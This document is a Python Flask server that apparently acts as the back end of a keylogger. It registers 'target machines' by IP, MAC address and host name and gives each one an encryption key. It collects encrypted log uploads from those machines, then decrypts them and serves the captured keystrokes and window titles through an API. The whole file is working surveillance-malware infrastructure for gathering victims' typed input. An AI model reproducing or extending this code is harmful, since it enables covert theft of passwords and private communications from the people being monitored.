from flask import Flask, request, jsonify
from flask_cors import CORS
import os, random,string
import time
from ToolBox import merge_dicts,decrypt
import os, json, time

app = Flask(__name__)
CORS(app)
DATA_FOLDER = "logs"





@app.route('/api/upload', methods=['POST'])
def upload():
    machine_data = request.get_json()
    if not machine_data or "machine" not in machine_data or "data" not in machine_data or not isinstance(machine_data['data'], dict):
        return jsonify({"error": "Invalid payload"}), 400

    with open('data.json', 'r', encoding='utf-8') as f:
        local_data = json.load(f)

    machine_sn = machine_data["machine"].replace("/", "_").replace("..", "_")
    if machine_sn not in local_data:
        return jsonify({"error": "machine not exist"}), 400

    log_data = machine_data["data"]
    machine_path = local_data[machine_sn]['path']
    os.makedirs(machine_path, exist_ok=True)
    try:
        with open(machine_path + '/log.json', 'r', encoding='utf-8') as f:
            try:
                machine_exist_data = json.load(f)
            except json.JSONDecodeError:
                machine_exist_data = []
    except FileNotFoundError:
        machine_exist_data = []
    # machine_log = merge_dicts(machine_exist_data, log_data)
    machine_exist_data.append(log_data)
    with open(machine_path + '/log.json', "w", encoding="utf-8") as f:
        json.dump(machine_exist_data, f, ensure_ascii=False, indent=4)

    return jsonify({"status": "success"}), 200


@app.route('/api/create_machine', methods=['POST'])
def create_machine():
    data_path = 'data.json'

    data = request.get_json()
    if not data or "ip" not in data or "host name" not in data or "mac address" not in data:
        return jsonify({"error": "Invalid payload"}), 400

    ip = data["ip"]
    mac_address = data["mac address"]
    host_name = data["host name"]
    key = "".join(random.choices(string.ascii_letters,k=512))

    try:
        with open(data_path, 'r', encoding='utf-8') as file:
            try:
                data_dict = json.load(file)
            except json.JSONDecodeError:
                data_dict = {}
    except FileNotFoundError:
        data_dict = {}

    serial_number = int(max(data_dict.keys(), default=1000)) + 1

    data_dict[serial_number] = {'mac address': mac_address, 'host name': host_name, 'ip': ip, 'path': f'logs/machine_{serial_number}',"key":key}
    with open(data_path, 'w', encoding='utf-8') as file:
        json.dump(data_dict, file, ensure_ascii=False, indent=4)

    return jsonify({"serial_number": serial_number,"key":key}), 200


@app.route('/check_server', methods=['GET'])
def check_server():
    return jsonify({"status": "OK"}), 200

@app.route('/api/get_demo',methods = ['GET'])
def get_demo():
    data = [{"time": ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(2,8))), "window": ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(2,8))), "text": ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(2,8)))} for i in range(random.randint(20,50))]
    return jsonify(data), 200


@app.route('/api/get_keystrokes', methods=['GET'])
def get_keystrokes():
    machine_sn = request.args.get('machine_sn')

    if not machine_sn:
        return jsonify({"error": "invalid machine serial number"}), 400

    try:
        with open('data.json', 'r', encoding='utf-8') as f:
            data = json.load(f)

        if machine_sn not in data:
            return jsonify({"error":f"machine {machine_sn} not found"}),400

        machine_path = data[machine_sn]['path']
        key = data[machine_sn]["key"]
        file_path = machine_path + "/log.json"

        if not os.path.exists(file_path):
            return jsonify({"error":"logs file not found"}),400

        with open(file_path, 'r',encoding='utf-8') as f:
            try:

                list_key_logs = json.load(f)

            except Exception as e:
                return jsonify({"error":"logs not found"}),400


        decrypt_data_list = [{decrypt(key,k): decrypt(key,v) for k, v in data.items()} for data in list_key_logs]
        merged_data = merge_dicts(*decrypt_data_list)
        return jsonify({"logs":merged_data
                        }), 200

    except Exception as e:
        return jsonify({"error":str(e)}), 500





@app.route('/api/get_target_machines_list', methods=['GET'])
def get_target_machines_list():
    try:
        with open('data.json', 'r', encoding='utf-8') as f:
            data = json.load(f)
            machines = {sn: machine_data['ip'] for sn, machine_data in data.items()}
    except Exception as e:
        machines = {}

    try:
        return jsonify(machines), 200
    except Exception as e:
        return jsonify({"error": "server error"}), 500




if __name__ == "__main__":
    app.run(port=9734, host='0.0.0.0')
